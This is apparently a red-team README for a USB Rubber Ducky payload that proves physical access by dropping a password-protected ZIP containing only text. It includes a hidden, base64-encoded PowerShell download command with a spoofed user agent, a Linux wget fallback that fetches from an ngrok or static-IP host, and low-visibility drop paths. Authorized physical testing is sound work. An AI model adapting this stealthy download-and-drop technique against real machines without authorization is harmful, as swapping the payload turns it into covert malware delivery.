
# 🦙 Sec-Llama Physical Penetration Proof Drop  
**Rubber Ducky Payload for Clean Proof of Physical Access**  
Version: 2025  
Author: sec-llama.com

---

## 📘 Overview

This project demonstrates a safe, ethical, and professional method to prove physical access during a Red Team or Physical Penetration Test by:
- Dropping a password-protected ZIP file on the target machine.
- Using a stealthy Rubber Ducky payload compatible with both Windows and Linux.
- Leaving no malware, backdoors, or harmful code — just clear proof of access.

---

## 🛠️ Requirements

**Hardware:**
- New Rubber Ducky (2025 version)  
- Target computer running Windows or Linux

**Software:**
- `zip` utility (Linux/Mac)  
- `ngrok` **OR** router port-forwarding with static IP  
- Python 3 (for simple HTTP server)

---

## 📂 Project Structure

```
proof/
├── proof.txt          # Statement of access
├── README.txt         # For the client (non-technical)
└── proof.zip          # Encrypted archive (final payload)
```

---

## 📦 Step 1: Create the Locked ZIP (On Linux)

1. Create the proof text files:
```bash
echo "Sec Llama Was Here. Physical Penetration Test successful. Date: 2025-05-15" > proof.txt

cat <<EOF > README.txt
This file was dropped during a physical penetration test performed by Sec-Llama (sec-llama.com).

No malicious payloads were used.
No files were modified or exfiltrated.
This ZIP serves only as proof of physical access.

Sec Llama Was Here.

The password will be shared in the final report.
You may verify the drop location and hash for authenticity.
EOF
```

2. Create the password-protected ZIP:
```bash
zip -e proof.zip proof.txt README.txt
```
> Use password: `SecLlama2025!`

---

## 🌐 Step 2: Host the ZIP File (Two Options)

### Option A: ngrok (recommended for stealth)
```bash
python3 -m http.server 8443
ngrok http 8443
```
Use the generated HTTPS URL like:  
`https://fancy-subdomain.ngrok.io/proof.zip`

### Option B: Static IP (router port forwarding)
If using a static IP and port forwarding:
```bash
python3 -m http.server 8443 --bind 0.0.0.0
```
Access the file via:  
`http://YOUR_STATIC_IP:8443/proof.zip`

---

## 🦆 Step 3: Encode PowerShell Command (from Linux)

1. Write your PowerShell command:
```powershell
Invoke-WebRequest -Uri 'https://your-url.com/proof.zip' -OutFile $env:APPDATA\Microsoft\Edge\profiles\proof.zip -Headers @{'User-Agent'='Mozilla/5.0'}
```

2. Encode it from Linux:
```bash
echo -n "Invoke-WebRequest -Uri 'https://your-url.com/proof.zip' -OutFile `$env:APPDATA\Microsoft\Edge\profiles\proof.zip` -Headers @{'User-Agent'='Mozilla/5.0'}" | iconv -f UTF-8 -t UTF-16LE | base64
```

Copy the Base64 output for use in the payload.

---

## 💣 Step 4: Final Cross-Platform Rubber Ducky Payload

This single script will attempt both Windows and Linux file drops:

```ducky
REM === WINDOWS DROP ===
DELAY 2000
WINDOWS r
DELAY 500
STRING powershell -WindowStyle Hidden -EncodedCommand <BASE64_STRING_HERE>
ENTER

REM === LINUX DROP (if Windows failed) ===
DELAY 4000
CTRL ALT t
DELAY 1000
STRING wget https://your-url.com/proof.zip -O /tmp/proof.zip
ENTER
```

- Replace `<BASE64_STRING_HERE>` with your encoded PowerShell string.
- Replace `https://your-url.com/proof.zip` with either your ngrok URL or static IP + port.

Save this as `inject.txt` and encode to `.bin` using [Rubber Ducky Encoder](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload-Encoder).

---

## 📁 Drop Locations

| OS     | File Path                                 |
|--------|--------------------------------------------|
| Windows | `%APPDATA%\Microsoft\Edge\profiles\proof.zip` |
| Linux   | `/tmp/proof.zip`                          |

These paths are low-visibility but easy to validate.

---

## ✅ Notes

- Clean, safe, and non-malicious.
- Stealthy ZIP drop leaves clear Red Team signature.
- File is encrypted and contains only text-based proof.
- Works on both Windows and Linux targets.

---

## 📞 Contact

**Sec-Llama Red Team**  
🔗 https://sec-llama.com  
📧 contact@sec-llama.com
